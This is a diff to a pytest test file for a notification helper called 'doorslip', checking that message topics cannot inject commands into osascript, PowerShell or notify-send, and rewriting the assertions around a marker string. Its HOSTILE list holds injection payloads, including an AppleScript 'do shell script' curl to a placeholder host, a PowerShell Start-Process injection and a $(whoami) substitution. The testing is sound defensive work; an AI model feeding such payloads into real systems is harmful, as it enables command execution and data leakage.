@@ -20,15 +20,20 @@ from doorslip import watch
 
 # What the finding was about, plus the shapes near it. None of these should
 # reach a shell, an interpreter, or a line of a log they were not meant for.
+# Every payload carries this. Asserting on a marker rather than on the shape
+# of a constant is what makes these tests able to fail: a constant compared
+# against itself passes no matter what the code around it does.
+MARK = "PAYLOADMARK"
+
 HOSTILE = [
-    '" with title "gotcha',
-    '"; do shell script "curl https://example.invalid/$(whoami)"; display notification "',
-    "'; Start-Process calc; '",
-    "'+$(whoami)+'",
-    "x\nsecond line\rthird",
-    "bell\x07 and escape\x1b[31m",
-    "back\\slash and `backtick`",
-    "\x00null",
+    f'" with title "{MARK}',
+    f'"; do shell script "curl https://example.invalid/{MARK}"; display notification "',
+    f"'; Start-Process {MARK}; '",
+    f"'+$({MARK})+'",
+    f"x\nsecond {MARK}\rthird",
+    f"bell\x07 {MARK} escape\x1b[31m",
+    f"back\\slash {MARK} `backtick`",
+    f"\x00null {MARK}",
 ]
 
 
@@ -60,11 +65,16 @@ def test_macos_keeps_the_script_constant(monkeypatch, calls, topic):
     watch.notify(_slip(topic))
 
     argv = calls[0]["argv"]
-    assert argv[: len(watch._OSASCRIPT)] == watch._OSASCRIPT
-    # Everything after the fixed script is data handed to the run handler.
-    assert len(argv) == len(watch._OSASCRIPT) + 2
-    for part in watch._OSASCRIPT:
-        assert "gotcha" not in part and "shell script" not in part
+
+    # Whatever osascript is told to interpret follows a `-e`. The payload must
+    # not be in any of them, and this holds however the constant is rewritten.
+    script = [argv[i + 1] for i, part in enumerate(argv) if part == "-e"]
+    assert script, "no script arguments at all"
+    assert all(MARK not in part for part in script)
+
+    # And it must be present as data, or the test would pass on a version
+    # that quietly dropped the topic instead of one that made it safe.
+    assert any(MARK in part for part in argv if part not in script)
 
 
 @pytest.mark.parametrize("topic", HOSTILE)
@@ -75,10 +85,12 @@ def test_windows_passes_text_through_the_environment(monkeypatch, calls, topic):
     watch.notify(_slip(topic))
 
     argv, env = calls[0]["argv"], calls[0]["env"]
-    assert argv == ["powershell", "-NoProfile", "-Command", watch._POWERSHELL]
-    assert "$env:DOORSLIP_NOTIFY_BODY" in watch._POWERSHELL
-    assert "Start-Process" not in argv[3]
-    assert env["DOORSLIP_NOTIFY_BODY"]
+
+    # The payload must be nowhere in what PowerShell parses, and present in
+    # what it reads as a value.
+    assert all(MARK not in part for part in argv)
+    assert MARK in env["DOORSLIP_NOTIFY_BODY"]
+    assert "$env:DOORSLIP_NOTIFY_BODY" in argv[-1]
 
 
 @pytest.mark.parametrize("topic", HOSTILE)
@@ -91,6 +103,10 @@ def test_linux_passes_arguments_and_not_a_string(monkeypatch, calls, topic):
     assert argv[0] == "notify-send"
     # `--` so a body opening with a dash is text rather than an option.
     assert argv[1] == "--"
+    # notify-send takes the text as arguments, so the payload belongs in the
+    # last one and nowhere before it.
+    assert MARK in argv[-1]
+    assert all(MARK not in part for part in argv[:-1])
 
 
 def test_a_leading_dash_is_not_read_as_an_option(monkeypatch, calls):
@@ -132,9 +148,12 @@ def test_a_missing_topic_is_not_the_word_none(monkeypatch, calls):
 
     watch.notify({"from": "tomas@doorslip.test"})
 
-    body = calls[0]["argv"][len(watch._OSASCRIPT)]
-    assert body == "from tomas@doorslip.test"
-    assert "None" not in body
+    argv = calls[0]["argv"]
+    script = [argv[i + 1] for i, part in enumerate(argv) if part == "-e"]
+    data = [part for part in argv if part not in script and part != "-e"]
+
+    assert "from tomas@doorslip.test" in data
+    assert not any("None" in part for part in argv)
 
 
 # -- one bad message must not end the watch ------------------------------
